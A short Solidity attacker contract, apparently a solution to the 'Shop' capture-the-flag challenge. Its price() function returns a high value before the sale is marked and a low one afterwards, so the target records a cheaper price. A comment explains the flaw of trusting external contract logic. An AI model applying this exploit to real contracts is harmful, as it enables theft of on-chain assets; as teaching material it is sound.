// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Shop.sol";

/// @title Shop challenge attacker contract 
/// @notice This contract is calling Shop contract buy() to become itself a Buyer instance,
/// having developed the function price() in order to trick the logic and save at Shop's 
/// price state variable a lower price. It's unsafe to change the state based on external
/// and untrusted contracts logic.

contract ShopAttack {
    
    bool isSold = false;
    Shop shopContract;

    constructor(address _address) public{
        shopContract = Shop(_address);
    }

    function price() external view returns (uint){
        if(!shopContract.isSold()){
            return 1000;
        }
        return 10;
    }

    function callBuy() external{
        shopContract.buy();
    }
  
}